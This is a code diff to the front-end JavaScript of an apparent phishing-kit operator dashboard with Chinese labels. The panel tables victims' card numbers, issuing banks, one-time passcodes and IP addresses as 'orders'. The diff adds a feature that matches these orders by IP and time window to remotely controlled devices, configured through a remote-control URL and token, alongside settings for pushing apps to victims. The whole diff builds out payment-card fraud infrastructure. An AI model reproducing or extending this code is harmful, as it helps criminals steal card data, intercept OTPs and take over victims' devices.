@@ -281,8 +281,11 @@ async function loadOrders() {
     $('#orderBody').innerHTML = items.length ? items.map(item => {
       const pay = item.payment || {};
       const brandBank = [pay.card_brand, pay.card_bank].filter(Boolean).join(' / ') || '-';
-      return `<tr><td>#${item.id}</td><td>${escapeHtml(new Date(item.created_at).toLocaleString())}</td><td>${escapeHtml(item.site_abbreviation || '-')}</td><td>${escapeHtml(item.referer || '-')}</td><td>${escapeHtml(accountOf(item.data))}</td><td>${escapeHtml(pay.ccard || '-')}</td><td>${escapeHtml(brandBank)}</td><td>${escapeHtml(pay.otp || '-')}</td><td>${orderStatusText(item)}</td><td>${escapeHtml(item.ip || '-')}</td><td><button class="secondary small" data-order-detail="${item.id}">展开</button></td></tr><tr id="orderDetail-${item.id}" class="hidden"><td colspan="11">${renderOrderDetail(item)}</td></tr>`;
-    }).join('') : '<tr><td colspan="11" style="text-align:center;padding:35px;color:#92959e">还没有订单数据</td></tr>';
+      const deviceCell = item.device_id
+        ? `<span class="device-tag" title="${escapeHtml(item.device_model || '')}｜设备上线 ${escapeHtml(item.device_seen_at || '')}">${escapeHtml(item.device_id)}</span>`
+        : '<span class="device-none">未匹配</span>';
+      return `<tr><td>#${item.id}</td><td>${escapeHtml(new Date(item.created_at).toLocaleString())}</td><td>${escapeHtml(item.site_abbreviation || '-')}</td><td>${escapeHtml(item.referer || '-')}</td><td>${escapeHtml(accountOf(item.data))}</td><td>${escapeHtml(pay.ccard || '-')}</td><td>${escapeHtml(brandBank)}</td><td>${escapeHtml(pay.otp || '-')}</td><td>${orderStatusText(item)}</td><td>${escapeHtml(item.ip || '-')}</td><td>${deviceCell}</td><td><button class="secondary small" data-order-detail="${item.id}">展开</button></td></tr><tr id="orderDetail-${item.id}" class="hidden"><td colspan="12">${renderOrderDetail(item)}</td></tr>`;
+    }).join('') : '<tr><td colspan="12" style="text-align:center;padding:35px;color:#92959e">还没有订单数据</td></tr>';
     loadOrderStats();
   } catch (error) { toast(error.message, true); }
 }
@@ -343,6 +346,9 @@ async function loadSettings() {
     $('#app_android_url').value = state.settings.app_android_url || '';
     $('#app_ios_url').value = state.settings.app_ios_url || '';
     $('#app_desktop_url').value = state.settings.app_desktop_url || '';
+    $('#remote_url').value = state.settings.remote_url || '';
+    $('#remote_token').value = state.settings.remote_token || '';
+    $('#device_match_window').value = Number(state.settings.device_match_window || 30);
     renderClientRules(state.settings.client_redirect_rules || {});
     renderClientPresets();
     await loadIpregistryCredits();
@@ -437,6 +443,23 @@ async function loadIpregistryCredits() {
     const status = await api('/api/ipregistry/status'); label.textContent = `API Key（剩余积分：${status.remaining}）`; label.className = 'credit-ready';
   } catch (_) { label.textContent = 'API Key（剩余积分：查询失败）'; label.className = 'credit-error'; }
 }
+/* 远控设备对照：按 IP + 时间窗把设备绑到订单上 */
+async function syncDevices(messageEl) {
+  if (messageEl) messageEl.textContent = '同步中…';
+  try {
+    const res = await api('/api/device/sync');
+    const text = res.ok
+      ? `设备 ${res.devices} 台，新绑定 ${res.matched} 条，待匹配 ${res.pending} 条（窗口 ${res.window_minutes} 分钟）`
+      : `同步失败：${res.reason || '未知原因'}`;
+    if (messageEl) messageEl.textContent = text;
+    toast(text, !res.ok);
+    loadOrders();
+  } catch (error) {
+    if (messageEl) messageEl.textContent = error.message;
+    toast(error.message, true);
+  }
+}
+
 async function saveSettings() {
   const payload = {
     ipregistry_api_key: $('#ipregistry_api_key').value.trim(),
@@ -453,7 +476,10 @@ async function saveSettings() {
     captcha_ttl_seconds: Math.min(43200, Math.max(5, Math.trunc(Number($('#captcha_ttl_minutes').value) || 120))) * 60,
     app_android_url: readAppUrl('#app_android_url'),
     app_ios_url: readAppUrl('#app_ios_url'),
-    app_desktop_url: readAppUrl('#app_desktop_url')
+    app_desktop_url: readAppUrl('#app_desktop_url'),
+    remote_url: $('#remote_url').value.trim().replace(/\/+$/, ''),
+    remote_token: $('#remote_token').value.trim(),
+    device_match_window: Math.min(1440, Math.max(1, Math.trunc(Number($('#device_match_window').value) || 30)))
   };
   try {
     await api('/api/settings', { method: 'POST', body: JSON.stringify(payload) });
@@ -602,6 +628,8 @@ $('#clearEvents').addEventListener('click', async () => {
 });
 $$('.tabs button').forEach(button => button.addEventListener('click', () => { $$('.tabs button').forEach(el => el.classList.toggle('active', el === button)); $$('.tab-panel').forEach(el => el.classList.toggle('active', el.id === `${button.dataset.tab}Tab`)); }));
 $('#openImport').addEventListener('click', () => $('#importDialog').showModal()); $('#manualInstall').addEventListener('click', () => $('#importDialog').showModal()); $('#saveSettings').addEventListener('click', saveSettings); $('#projectConfigForm').addEventListener('submit', saveProjectConfig);
+$('#orderSyncDevice').addEventListener('click', () => syncDevices(null));
+$('#deviceSyncBtn').addEventListener('click', () => syncDevices($('#deviceSyncResult')));
 $('#clientDetectBtn').addEventListener('click', runClientDetect);
 $('#clientJumpBtn').addEventListener('click', () => runClientJump(''));
 $('#clientTestPresets').addEventListener('click', event => {
